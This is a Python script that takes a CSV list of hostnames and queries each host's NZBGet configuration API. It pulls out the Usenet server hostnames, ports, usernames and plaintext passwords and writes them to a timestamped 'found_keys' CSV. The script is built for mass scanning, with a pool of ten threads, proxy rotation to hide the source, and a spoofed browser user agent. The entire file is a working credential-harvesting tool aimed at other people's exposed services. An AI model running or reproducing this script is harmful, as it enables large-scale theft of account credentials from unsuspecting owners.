import csv
from io import TextIOWrapper
import json
import re
import requests
from datetime import datetime
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed
import pynzbgetapi


def extract_hostnames(csv_file_path):
    hostnames = []
    with open(csv_file_path, 'r', newline='') as csvfile:
        reader = csv.reader(csvfile)
        for row in reader:
            if row:  # Ensure the row is not empty
                # Assumes hostnames are in the first column
                hostnames.append(row[0])
    return hostnames

# Function to search for keys in the webpage content


def search_for_keys(url, output_file: TextIOWrapper, proxy=None):
    print(f"Now searching {url}")
    try:
        # Define headers to mimic a web browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        }
        proxies = {"http": proxy, "https": proxy} if proxy else None
        # Make the HTTP request with the defined headers

        ng_api = pynzbgetapi.NZBGetAPI(url)
        json_response = ng_api.config()
        servers_found = 0
        for item in json_response:
            if item['Name'].startswith('Server'):
                property_name = item["Name"].split(".", 1)[1]
                if property_name == 'Host':
                    servers_found = servers_found + 1
                    output_file.write('\n')

                if property_name == 'Host' \
                        or property_name == 'Username' \
                        or property_name == 'Password' \
                        or property_name == 'Port':
                    output_file.write(item['Value'] + ';')
                if property_name == 'Connections':
                    output_file.write(item['Value'])

        output_file.flush()
        print(f"Found {servers_found} servers in {url}")

    except Exception as e:
        print(f"An error occurred while trying to get {url}: {e}")


# Main function to process the hostnames and write the results to the output file
def main(csv_file_path, output_file_path, use_proxies, proxies_file=None):
    hostnames = extract_hostnames(csv_file_path)
    proxies_list = []

    if use_proxies and proxies_file:
        # Load proxies from the specified file
        with open(proxies_file, 'r') as file:
            proxies_list = [line.strip() for line in file if line.strip()]
    proxy_cycle = cycle(proxies_list) if proxies_list else None

    # Open the output file once and pass the file object to the threads
    with open(output_file_path, 'w') as output_file:
        output_file.write(f"Host;Port;Username;Password;Connections")
        # Use ThreadPoolExecutor to create a pool of threads
        # Adjust max_workers as needed
        with ThreadPoolExecutor(max_workers=10) as executor:
            # Submit tasks to the executor
            future_to_url = {
                executor.submit(
                    search_for_keys,
                    hostname,
                    output_file,
                    next(proxy_cycle) if proxy_cycle else None
                ): hostname for hostname in hostnames
            }

            # Process results as they are completed
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    future.result()  # We already logged the result in the search function
                except Exception as e:
                    print(f"An error occurred while processing {url}: {e}")

# Simple TUI to get user input


def simple_tui():

    use_proxies = input(
        "Do you want to use proxies? (yes/no): ").lower() == 'yes'
    proxies_file = None
    if use_proxies:
        proxies_file = input(
            "Enter the name of the proxies file (i.e., proxies.txt): ")

    csv_file_name = input(
        "Enter the name of the CSV file to search (with or without '.csv'): ")
    if not csv_file_name.lower().endswith('.csv'):
        csv_file_name += '.csv'
    csv_file_path = csv_file_name

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_file_path = f'found_keys_{timestamp}.csv'

    main(csv_file_path,
         output_file_path, use_proxies, proxies_file)


if __name__ == '__main__':
    simple_tui()
